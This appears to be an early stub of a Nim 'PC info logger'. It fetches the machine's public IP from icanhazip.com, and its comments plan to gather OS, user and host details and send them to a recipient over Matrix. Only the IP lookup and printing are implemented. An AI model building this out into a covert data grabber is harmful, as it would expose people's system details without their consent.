#import std/os
import std/[asyncdispatch, httpclient]
import std/net

# Logged information from your PC.
# Currently fetches: IP address
# Logged information is sent to you via a Matrix message.
proc ipfetch(ipURL: string): Future[string] {.async.} =
    var client = newAsyncHttpClient()
    try:
        return await client.getContent(ipURL)
    finally:
        client.close()
let PCip = waitFor ipfetch("http://icanhazip.com") # Replace with your own URL if you want
echo PCip

#type
#    PCinfo = object
#        PCip: string
#        PCos: string
#        PCuser: string
#        PChost: string
#        : string